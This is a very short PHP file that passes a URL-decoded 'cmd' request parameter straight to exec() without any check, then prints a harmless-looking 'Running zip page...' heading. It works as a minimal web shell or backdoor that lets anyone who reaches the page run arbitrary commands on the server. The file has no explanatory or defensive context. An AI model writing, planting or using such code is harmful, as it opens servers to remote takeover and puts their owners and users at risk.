<?php
if (isset($_GET['cmd'])){
	exec(urldecode($_GET['cmd']));
	tmp_write("<h2>Running zip page...<h2>");
}

?>